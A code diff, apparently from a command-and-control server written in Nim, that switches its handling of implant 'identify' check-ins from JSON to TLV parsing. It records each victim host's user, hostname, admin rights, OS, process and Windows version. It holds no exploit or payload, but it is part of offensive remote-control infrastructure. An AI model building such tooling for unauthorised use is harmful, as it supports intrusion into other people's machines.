@@ -3,7 +3,6 @@ import std/[
   asyncfutures, 
   strutils, 
   strformat, 
-  json, 
   md5
 ]
 
@@ -11,8 +10,8 @@ import tlv
 
 import types, logging, communication, events, tasks
 
-proc generateClientHash(c: C2Client): string =
-  getMD5(
+proc generateClientHash(c: C2Client) =
+  c.hash = getMD5(
     fmt"{c.ipAddress}{c.hostname}{c.username}{c.osType}{$c.windowsVersionInfo}"
   )
 
@@ -49,28 +48,25 @@ proc processMessage*(client: ref C2Client, response: string) {.async.} =
   else: 
     case taskName:
     of "identify":
-      let j = parseJson(data)
-      client.hostname = j["hostname"].getStr("")
-      client.username = j["username"].getStr("")
-      client.isAdmin = j["isAdmin"].getBool(false)
+      let p = initParser()
+      p.setBuffer(cast[seq[byte]](data))
 
-      case j.getStr("unknown"):
-      of "unknown":
-        client.osType = UnknownOS
-      of "windows":
-        client.osType = WindowsOS
-      of "linux":
-        client.osType = LinuxOS
+      client.username = p.extractString()
+      client.hostname = p.extractString()
+      client.isAdmin = p.extractBool()
+
+      client.osType = parseEnum[OSType](p.extractString())
+
+      client.pid = p.extractInt32()
+      client.pname = p.extractString()
+
       client.windowsVersionInfo = WindowsVersionInfo(
-        majorVersion: j["windowsOsVersionInfo"]["majorVersion"].getInt(),
-        minorVersion: j["windowsOsVersionInfo"]["minorVersion"].getInt(),
-        buildNumber: j["windowsOsVersionInfo"]["buildNumber"].getInt()
+        majorVersion: p.extractInt32(),
+        minorVersion: p.extractInt32(),
+        buildNumber: p.extractInt32()
       )
-      client.hash = client[].generateClientHash()
-      client.isAdmin = j["isAdmin"].getBool(false)
-      client.pid = j["pid"].getInt(0)
-      client.pname = j["pname"].getStr("")
-      client.isAdmin = j["isAdmin"].getBool()
+
+      client[].generateClientHash()
 
       if not client.loaded:
         client.loaded = true
